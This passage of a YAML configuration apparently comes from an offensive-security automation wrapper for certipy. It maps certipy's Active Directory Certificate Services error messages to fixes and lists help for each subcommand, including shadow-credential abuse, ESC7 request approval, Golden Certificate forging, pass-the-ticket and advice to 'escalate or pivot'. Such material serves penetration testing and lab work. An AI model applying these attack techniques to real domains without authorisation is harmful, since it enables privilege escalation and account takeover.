    remediation: "TCP connection refused on the LDAP port (389/636) or RPC port (135) or HTTP enrollment (80/443). Confirm with nmap; the host is reachable but the service is filtered or down."
  - signal: "Connection reset by peer"
    remediation: "TCP connection actively reset — usually indicates a firewall, not a service issue. Check VPN routing and target's firewall rules."
  - signal: "socket connection error"
    remediation: "Generic certipy network error — read the next line for the specific cause. Common: timeout, refused, or unreachable. Verify DC IP and port reachability."
  - signal: "Failed to get DCE RPC connection"
    remediation: "RPC endpoint mapper failure — port 135 unreachable or RPC service not listening. Try `-dcom` flag for the DCOM transport, or `-web` for HTTP Web Enrollment as alternative."
  - signal: "Failed to connect to LDAP server"
    remediation: "LDAP service unreachable on the DC. Check port 389/636 with nmap; verify -dc-ip; try `-scheme ldaps -port 636` for explicit LDAPS."
  - signal: "STATUS_LOGON_FAILURE"
    remediation: "SMB / NTLM logon failure — wrong password, wrong username, wrong domain. Verify credentials. For -hashes, format MUST be `:NT` (leading colon for empty LM half) or `LM:NT`."
  - signal: "STATUS_ACCESS_DENIED"
    remediation: "Auth succeeded but operation-level access denied. For `find`, may indicate user lacks LDAP read on certain CN=Configuration objects. For `ca` operations, need ManageCA or ManageCertificates rights."
  - signal: "LDAP NTLM authentication failed"
    remediation: "NTLM bind failed at the LDAP layer. Verify -username (UPN format) and -password / -hashes. NTLM may be disabled domain-wide — switch to Kerberos with `-k`."
  - signal: "NTLM negotiate failed"
    remediation: "NTLM negotiation failed at LDAP — same root as 'LDAP NTLM authentication failed'. Check NTLM is enabled on the DC; switch to `-k` Kerberos if disabled."
  - signal: "KRB_AP_ERR_SKEW"
    remediation: "Clock skew >5 minutes between container and DC. Set FAKETIME via the entrypoint (the certipy image has libfaketime baked in for this). Alternatively, sync the container clock with `chrony` or use clock_offset detection."
  - signal: "KDC_ERR_PREAUTH_FAILED"
    remediation: "Wrong password during Kerberos preauth — the Kerberos equivalent of STATUS_LOGON_FAILURE. Verify the password / hash."
  - signal: "KDC_ERR_S_PRINCIPAL_UNKNOWN"
    remediation: "Service principal not found — pass `-target <DC FQDN>` (NOT IP) for SPN resolution when using `-k`. Kerberos requires the FQDN to construct cifs/host or http/host SPNs."
  - signal: "KDC_ERR_C_PRINCIPAL_UNKNOWN"
    remediation: "User principal unknown — verify -username is in UPN format (user@domain.local) and the domain matches the realm name."
  - signal: "Kerberos authentication failed"
    remediation: "Generic Kerberos failure — read prior lines for the specific KDC_ERR. Verify ccache (KRB5CCNAME) is valid and not expired."
  - signal: "CERTSRV_E_TEMPLATE_DENIED"
    remediation: "User lacks Enroll / Autoenroll permission on the template. Check template ACL with `find -enabled` and the template's Permissions section. NOTE: ESC7 SubCA flow expects this denial — capture the request_id and approve via `ca -issue-request`."
  - signal: "CERTSRV_E_UNSUPPORTED_CERT_TYPE"
    remediation: "Template not published on this CA. Verify template name (CASE-SENSITIVE) with `find` output and that the template is listed in the CA's published templates (`ca -list-templates`)."
  - signal: "CERTSRV_E_RESTRICTEDOFFICER"
    remediation: "Enrollment agent restrictions block the request. The CA has CERTSRV_FLAG_NO_REQUEST_HANDLER_AGENT_RESTRICTIONS disabled. Try a different CA or enrollment agent cert."
  - signal: "Failed to request certificate"
    remediation: "Generic AD CS request failure — read prior lines for CERTSRV_E_* code. Common causes: template not vulnerable to chosen ESC; CA not reachable; user lacks enrollment permission."
  - signal: "Could not update Key Credentials"
    remediation: "shadow attack — failed to write msDS-KeyCredentialLink. User likely lacks GenericAll/GenericWrite/WriteProperty on the target. Check bloodhound for accounts with the required ACL."
  - signal: "insufficient access rights"
    remediation: "AD operation rejected for permission reasons. Same root as STATUS_ACCESS_DENIED but at the LDAP modify layer. Check the target object's DACL."
  - signal: "rpc_s_access_denied"
    remediation: "RPC permission denied — usually on `ca` operations (need ManageCA / ManageCertificates) or on `shadow` (need write to msDS-KeyCredentialLink)."
  - signal: "RPC_E_CALL_COMPLETE"
    remediation: "RPC call completed before the handler ran (timing race). Add `-dcom` flag to force DCOM transport which avoids this race."
  - signal: "Failed to connect to Service Control Manager"
    remediation: "`ca -backup` requires DCOM/RPC access to SCM (typically local admin on the CA server). Insufficient privileges on the CA — escalate or pivot."
  - signal: "Username or domain is not specified"
    remediation: "auth — certificate has no UPN embedded (e.g., machine cert). Pass `-username <user>` and `-domain <domain>` explicitly."
  - signal: "Certificate is not valid for client authentication"
    remediation: "The cert lacks Client Authentication EKU. Pick a different template (one with msPKI-Certificate-Application-Policy including 1.3.6.1.5.5.7.3.2) or wait for AD replication if you just modified the template."
  - signal: "error: the following arguments are required"
    remediation: "argparse — missing required arg. Common: `-username` (most subcommands), `-dc-ip`, `-ca` (req/ca), `-template` (req), `-pfx` (auth), `-account` (shadow). Read the specific arg name in the error."
  - signal: "unrecognized arguments"
    remediation: "argparse — unknown flag. CHECK THAT YOU USED SINGLE-DASH LONG FORM (`-username`, NOT `--username`). Many flags exist only on specific subcommands — `-vulnerable` is `find`-only, `-template` is `req`-only, etc."
  - signal: "invalid choice"
    remediation: "argparse — bad value for an enum. Common: shadow action must be `auto/list/add/remove/clear/info`; account action must be `create/read/update/delete`; parse format must be `bof/reg`."

help_commands:
  - command: "certipy --help"
    purpose: "Top-level help — lists all sub-commands and global flags"
  - command: "certipy -h"
    purpose: "Short alias for --help"
  - command: "certipy find --help"
    purpose: "find subcommand: ESC1-ESC16 enumeration (-vulnerable, -enabled, -dc-only, -sid, -output, -bloodhound)"
  - command: "certipy req --help"
    purpose: "req subcommand: certificate request (-ca, -template, -upn, -dns, -sid, -on-behalf-of, -pfx, -retrieve, -web, -dcom, -application-policies)"
  - command: "certipy auth --help"
    purpose: "auth subcommand: PKINIT auth (-pfx, -pfx-pass, -no-save, -kirbi, -no-hash, -ldap-shell)"
  - command: "certipy shadow --help"
    purpose: "shadow subcommand: msDS-KeyCredentialLink abuse (-account, -device-id; positional action: auto/list/add/remove/clear/info)"
  - command: "certipy forge --help"
    purpose: "forge subcommand: Golden Certificate (-ca-pfx, -ca-password, -upn, -dns, -subject, -sid, -validity-period, -crl, -serial)"
  - command: "certipy template --help"
    purpose: "template subcommand: read/save_config/write_default/write_config (-save-configuration, -write-configuration, -write-default-configuration, -force, -no-save)"
  - command: "certipy ca --help"
    purpose: "ca subcommand: ESC7 (-enable-template, -disable-template, -issue-request, -deny-request, -add-officer, -remove-officer, -backup, -config, -list-templates)"
  - command: "certipy account --help"
    purpose: "account subcommand: machine/user account ops (-user, -dns, -upn, -sam, -spns, -pass; positional action: create/read/update/delete)"
  - command: "certipy cert --help"
    purpose: "cert subcommand: format conversion (-pfx, -key, -cert, -out, -export, -nocert, -nokey, -export-password)"
  - command: "certipy parse --help"
    purpose: "parse subcommand: offline ADCS analysis from BOF/registry (-format, -sids, -published; positional input file)"
  - command: "certipy ptt --help"
    purpose: "ptt subcommand: pass-the-ticket (-pfx, -no-save)"
  - command: "certipy relay --help"
    purpose: "relay subcommand: NTLM relay listener (NOT for cli_in_container — interactive long-running. Prefer impacket-relay/ntlmrelayx.py)"

